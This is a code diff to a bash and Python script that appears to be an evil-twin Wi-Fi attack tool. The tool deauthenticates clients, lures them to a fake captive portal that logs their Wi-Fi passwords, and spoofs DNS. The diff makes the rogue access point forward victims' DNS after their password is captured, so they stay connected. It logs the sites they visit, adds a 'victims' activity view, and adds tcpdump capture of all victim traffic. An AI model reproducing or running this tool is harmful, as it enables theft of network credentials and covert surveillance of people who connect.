@@ -232,6 +232,10 @@ check_programs() {
         missing_packages="${missing_packages} hostapd"
     fi
 
+    if ! [ -x "$(command -v tcpdump 2>&1)" ]; then
+        missing_packages="${missing_packages} tcpdump"
+    fi
+
     if [ -n "${missing_packages}" ]; then
         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Missing packages:${BOLD_YELLOW}${missing_packages}${WHITE}"
         echo ""
@@ -665,7 +669,9 @@ import socket, struct, datetime, sys, os
 
 AP_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.3.1"
 LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/dns.log"
+UPSTREAM = sys.argv[3] if len(sys.argv) > 3 else "8.8.8.8"
 PID_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_server.pid")
+FORWARD_FLAG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_forward")
 
 def log(msg):
     try:
@@ -709,6 +715,7 @@ while True:
     questions = b""
     answers = b""
     ancount = 0
+    domains = []
     for _ in range(qdcount):
         end = data.find(b"\x00", pos)
         if end == -1:
@@ -717,12 +724,27 @@ while True:
         qtype = data[end+1:end+3]
         qclass = data[end+3:end+5]
         domain, _ = decode_qname(data, pos)
-        log("query %-40s from %s" % (domain, addr[0]))
+        domains.append(domain)
         questions += qname + qtype + qclass
         if qtype == b"\x00\x01":
             answers += b"\xc0\x0c" + qtype + qclass + b"\x00\x00\x00\x1e\x00\x04" + ip_bytes
             ancount += 1
         pos = end + 5
+    if os.path.exists(FORWARD_FLAG):
+        for domain in domains:
+            log("visit %-40s from %s" % (domain, addr[0]))
+        try:
+            fwd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            fwd.settimeout(3)
+            fwd.sendto(data, (UPSTREAM, 53))
+            resp, _ = fwd.recvfrom(4096)
+            fwd.close()
+            sock.sendto(resp, addr)
+        except Exception:
+            pass
+        continue
+    for domain in domains:
+        log("query %-40s from %s" % (domain, addr[0]))
     response = tid + b"\x81\x80" + struct.pack("!HHHH", qdcount, ancount, 0, 0) + questions + answers
     sock.sendto(response, addr)
 PYEOF
@@ -829,16 +851,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
         with open(LOG_FILE, "a") as f:
             f.write(f"[{ts}] Password: {password}\n")
 
-        import subprocess, signal, os
+        import subprocess, os
         AUTHED = True
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "443"], capture_output=True)
-        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], capture_output=True)
-        try:
-            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_server.pid")) as f:
-                pid = int(f.read().strip())
-                os.kill(pid, signal.SIGTERM)
-        except: pass
+        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_forward"), "w") as f:
+            f.write("1\n")
 
         self.send_response(200)
         self.send_header("Content-type", "text/html; charset=utf-8")
@@ -926,6 +944,7 @@ cleanup() {
     fi
     pkill -f "captive_portal.py" 2>/dev/null || true
     pkill -f "dns_server.py" 2>/dev/null || true
+    pkill -f "tcpdump -i" 2>/dev/null || true
     [ -n "${CLIENT_WATCHER_PID:-}" ] && kill "${CLIENT_WATCHER_PID}" 2>/dev/null || true
     local ap_iface="${AP_IFACE:-at0}"
     iptables -t nat -D PREROUTING -i "${ap_iface}" -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
@@ -1101,7 +1120,7 @@ HCONF
                     fi
                     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check: ${BOLD_CYAN}${TMP_DIR}/{hostapd,dhcpd,aireplay-ng}.log${GREEN}, passwords: ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
                     echo ""
-                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[c]${GREEN}aptive portal ${WHITE}| ${BOLD_YELLOW}[s]${GREEN}tatus ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[c]${GREEN}aptive portal ${WHITE}| ${BOLD_YELLOW}[v]${GREEN}ictims ${WHITE}| ${BOLD_YELLOW}[t]${GREEN}raffic capture ${WHITE}| ${BOLD_YELLOW}[s]${GREEN}tatus ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
                     deauth_running=false
                     portal_running=false
                     while true; do
@@ -1139,7 +1158,7 @@ HCONF
                                     iptables -t nat -A PREROUTING -i "${wlan}" -p udp --dport 53 -j REDIRECT --to-port 53
                                     iptables -I INPUT 1 -i "${wlan}" -j ACCEPT
 
-                                    run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns_server.log" "dns_server"
+                                    run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns_server.log ${DNS}" "dns_server"
                                     run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80 ${wlan}" "captive_portal"
 
                                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
@@ -1147,6 +1166,26 @@ HCONF
                                 else
                                     echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Captive portal already running.${WHITE}"
                                 fi
+                                ;;
+                            v|V)
+                                echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Victim activity (DNS lookups, newest last):${WHITE}"
+                                if [ -f "${TMP_DIR}/dns_server.log" ]; then
+                                    tail -30 "${TMP_DIR}/dns_server.log" | grep -E 'query|visit' || echo -e "${WHITE}  nothing yet${WHITE}"
+                                else
+                                    echo -e "${WHITE}  DNS server not started (press c first)${WHITE}"
+                                fi
+                                echo ""
+                                ;;
+                            t|T)
+                                if pgrep -f "tcpdump -i" >/dev/null 2>&1; then
+                                    pkill -f "tcpdump -i" 2>/dev/null || true
+                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Traffic capture stopped: ${BOLD_CYAN}${TMP_DIR}/capture/victims.pcap${WHITE}"
+                                else
+                                    mkdir -p "${TMP_DIR}/capture"
+                                    run_background "tcpdump -i ${wlan} -s 0 -U -w ${TMP_DIR}/capture/victims.pcap" "tcpdump"
+                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Capturing victim traffic to ${BOLD_CYAN}${TMP_DIR}/capture/victims.pcap${GREEN} (open in Wireshark; press ${BOLD_YELLOW}t${GREEN} to stop)${WHITE}"
+                                fi
+                                echo ""
                                 ;;
                             s|S)
                                 echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} iptables NAT (PREROUTING):${WHITE}"
